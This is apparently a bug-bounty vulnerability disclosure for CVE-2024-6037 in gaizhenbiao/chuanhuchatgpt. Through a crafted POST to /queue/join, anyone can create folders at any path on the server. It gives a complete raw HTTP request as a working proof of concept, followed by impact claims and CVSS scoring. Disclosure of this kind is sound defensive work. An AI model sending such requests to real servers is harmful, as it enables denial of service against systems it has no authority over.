@@ -1,0 +1,48 @@
+Title: Arbitrary folder creation, at any location of the Server, including C:/ (root) dir in gaizhenbiao/chuanhuchatgpt
+
+Proof of Concept: 
+Go to homepage, and try to refresh the Conversation with refresh button just right to the search box, and intercept the request in BurpSuite.
+
+POST /queue/join? HTTP/1.1
+Host: 127.0.0.1:7860
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:7860/
+Content-Type: application/json
+Content-Length: 92
+Origin: http://127.0.0.1:7860
+Connection: close
+Cookie: <Cookie_Here>
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+
+{"data":["Folder_Location_Here"],"event_data":null,"fn_index":37,"trigger_id":23,"session_hash":"8xp7gyfjei"}
+
+Replace "Folder_Location_Here" with your folder location. e:g: "C:\\IamNewFolder" .
+Done.
+
+Impact: 
+Resource Exhaustion:The ability to create an excessive number of folders can consume significant server resources, including disk space and memory, leading to resource exhaustion and performance degradation. As we know, one newly created empty directory takes 4096 bytes (4KB), exacerbating the potential for rapid resource consumption in the event of a folder flooding attack.Denial of Service (DoS):Attackers can exploit this vulnerability to launch a denial-of-service attack, disrupting normal server operations and rendering the application inaccessible to legitimate users.Server Unavailability:The flood of folders created by attackers may render the server temporarily or permanently unavailable, causing downtime and impacting the availability of critical services.Data Loss and Corruption:The overwhelming number of folders created on the server may result in data loss, corruption, or unintended deletion of files stored in affected directories.
+
+CVE ID: CVE-2024-6037
+Status: (published)
+Vulnerability Type: CWE-400: Uncontrolled Resource Consumption
+Severity: High (7.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: None
+Availability: High
+Registry: Other
+Affected Version: 20240410
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
